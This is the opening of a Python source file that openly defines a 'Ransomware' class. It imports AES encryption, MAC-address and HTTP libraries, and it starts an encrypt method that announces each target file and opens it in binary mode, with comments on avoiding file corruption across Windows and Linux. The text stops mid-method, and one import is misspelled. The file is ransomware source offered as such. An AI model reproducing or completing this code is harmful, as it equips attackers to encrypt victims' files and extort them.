##!/usr/bin/python3
import requests
import base64
import urllib
import hashlib
import binascii
# python -m pip install getmac
import getmac
import os
# python -m pip install colored
from colored import fg, attr
# python -m pip install pycryptodome
from Crypto.cipher import AES
from Crypto.Util.Padding import pad
from Crypto import Random
from Crypto.Random import get_random_bytes

class Ransomware:
    def encrypt(self, file):
        print("{}[+] Encrypting -> {}{}".format(fg(9), file, attr(0)))
        # Python doc
        # https://docs.python.org/2/tutorial/inputoutput.html#reading-and-writing-files
        
        # OS difference
        # Python on Windows makes a distinction between
        # text & bin files
        # EOL characters in text files are auto-
        # altered slightly when data is read/written
        #
        # This behind-the-scenes modification to file data
        # is fine for ASCII text files
        # Yet, it'll corrupt binary data .jpg / .exe
        # Thus, be careful to use binary mode when
        # reading & writing these files
        #
        # Working on Windows "rb"
        # Working on Linux "r"
        
        # Working on both Windows & Linux 
        # Open binary file in Read/Write mode "r+b"
        fd = open(file, "rb")
        
